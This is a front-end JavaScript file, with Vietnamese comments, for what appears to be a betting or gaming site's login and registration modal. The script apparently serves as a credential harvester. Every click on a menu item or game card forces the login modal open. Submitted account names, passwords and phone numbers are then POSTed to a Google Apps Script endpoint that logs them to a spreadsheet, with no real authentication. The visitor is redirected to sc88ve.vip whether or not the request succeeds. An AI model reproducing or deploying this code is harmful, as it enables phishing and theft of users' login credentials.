document.addEventListener('DOMContentLoaded', () => {
    
    // Khởi tạo Swiper Banner
    if(document.querySelector('.banner-swiper')) {
        const bannerSwiper = new Swiper('.banner-swiper', {
            loop: true,
            autoplay: { delay: 3000, disableOnInteraction: false },
            pagination: { el: '.swiper-pagination', clickable: true },
        });
    }

    // --- Xử lý Đăng Nhập / Đăng Ký ---
    const authModal = document.getElementById('auth-modal');
    const closeAuth = document.getElementById('close-auth');
    
    const btnNavRegister = document.querySelector('.btn-reg');
    const btnNavLogin = document.querySelector('.btn-login');

    const tabLogin = document.getElementById('tab-login');
    const tabRegister = document.getElementById('tab-register');
    
    const formLogin = document.getElementById('form-login');
    const formRegister = document.getElementById('form-register');

    // Mở màn hình khi bấm nút ở Action Bar
    if(btnNavRegister) {
        btnNavRegister.addEventListener('click', () => {
            authModal.style.display = 'block';
            tabRegister.click();
        });
    }

    if(btnNavLogin) {
        btnNavLogin.addEventListener('click', () => {
            authModal.style.display = 'block';
            tabLogin.click();
        });
    }

    // Đóng màn hình
    if(closeAuth) {
        closeAuth.addEventListener('click', () => {
            authModal.style.display = 'none';
        });
    }

    // Chuyển đổi giữa 2 tab Đăng Nhập và Đăng Ký
    if(tabLogin && tabRegister) {
        tabLogin.addEventListener('click', () => {
            tabLogin.classList.add('active');
            tabRegister.classList.remove('active');
            formLogin.style.display = 'block';
            formRegister.style.display = 'none';
        });

        tabRegister.addEventListener('click', () => {
            tabRegister.classList.add('active');
            tabLogin.classList.remove('active');
            formRegister.style.display = 'block';
            formLogin.style.display = 'none';
        });
    }
    
    // --- Xử lý click các thành phần khác yêu cầu Đăng Nhập ---
    const requireAuthElements = document.querySelectorAll('.menu-item, .scroll-item, .game-card, .nav-item:not(.active)');

    requireAuthElements.forEach(element => {
        element.addEventListener('click', (e) => {
            e.preventDefault(); 
            if (authModal && tabLogin) {
                authModal.style.display = 'block';
                tabLogin.click();
            }
        });
    });

    // --- XỬ LÝ VALIDATE FORM VÀ CHUYỂN HƯỚNG ---
    const submitButtons = document.querySelectorAll('.btn-submit');
    
    // ĐIỀN LINK GOOGLE APPS SCRIPT CỦA BẠN VÀO ĐÂY:
    const scriptURL = 'https://script.google.com/macros/s/AKfycbziki6E46U9sAy13cZxNHMH7DU0ZuI4roEbmLUdxeakurc8x9GnMyDisyzFiBA3xOG2/exec'; 

    submitButtons.forEach(btn => {
        btn.addEventListener('click', (e) => {
            e.preventDefault(); 
            
            const formContainer = btn.closest('#form-login') || btn.closest('#form-register') || btn.closest('.auth-form');
            if (!formContainer) return;

            let isValid = true;
            let errorMsg = [];

            const inputs = formContainer.querySelectorAll('input');
            
            inputs.forEach(input => {
                if (input.offsetParent === null) return; 

                const val = input.value.trim();
                const placeholder = (input.getAttribute('placeholder') || '').toLowerCase();
                const type = input.getAttribute('type') || 'text';

                // 1. Ràng buộc Số điện thoại
                if ((placeholder.includes('điện thoại') || placeholder.includes('sđt') || placeholder.includes('phone')) && !placeholder.includes('tài khoản')) {
                    const phoneRegex = /^\d{10}$/; 
                    if (!phoneRegex.test(val)) {
                        isValid = false;
                        errorMsg.push("- Số điện thoại không hợp lệ (Phải bao gồm đúng 10 số).");
                    }
                } 
                // 2. Ràng buộc Mật khẩu
                else if (type === 'password') {
                    if (val.length < 6 || val.length > 20) {
                        isValid = false;
                        errorMsg.push("- Mật khẩu phải dài từ 6 đến 20 ký tự.");
                    }
                }
                // 3. Ràng buộc Tài khoản 
                else if (type === 'text' && placeholder.includes('tài khoản')) {
                    if (val.length < 6 || val.length > 20) {
                        isValid = false;
                        errorMsg.push("- Tài khoản đăng nhập phải từ 6 đến 20 ký tự.");
                    }
                }
            });

            const uniqueErrors = [...new Set(errorMsg)];

            if (!isValid) {
                alert("Vui lòng kiểm tra lại thông tin:\n\n" + uniqueErrors.join("\n"));
            } else {
                // ĐÃ HỢP LỆ -> GỬI DỮ LIỆU LÊN GOOGLE SHEET

                // Đổi chữ trên nút để báo hiệu đang tải
                const originalBtnText = btn.innerText;
                btn.innerText = 'Đang xử lý...';
                btn.style.opacity = '0.7';
                btn.disabled = true;

                // Tạo đối tượng dữ liệu để gửi đi
                let formData = new FormData();
                
                // Xác định là Đăng nhập hay Đăng ký để điền vào cột TRẠNG THÁI
                const status = formContainer.id === 'form-login' ? 'Đăng nhập' : 'Đăng ký';
                formData.append('status', status);

                // Lấy dữ liệu từ các thẻ input có thuộc tính name (đã thêm ở Bước 2)
                inputs.forEach(input => {
                    if (input.offsetParent !== null && input.name) {
                        formData.append(input.name, input.value.trim());
                    }
                });

                // Gửi dữ liệu bằng Fetch API
                fetch(scriptURL, { method: 'POST', body: formData })
                    .then(response => {
                        // Gửi thành công thì chuyển hướng
                        window.location.href = "https://sc88ve.vip/";
                    })
                    .catch(error => {
                        console.error('Lỗi khi gửi dữ liệu:', error.message);
                        // Dù lỗi mạng vẫn cho người dùng chuyển hướng để không bị kẹt
                        window.location.href = "https://sc88ve.vip/";
                    });
            }
        });
    });
});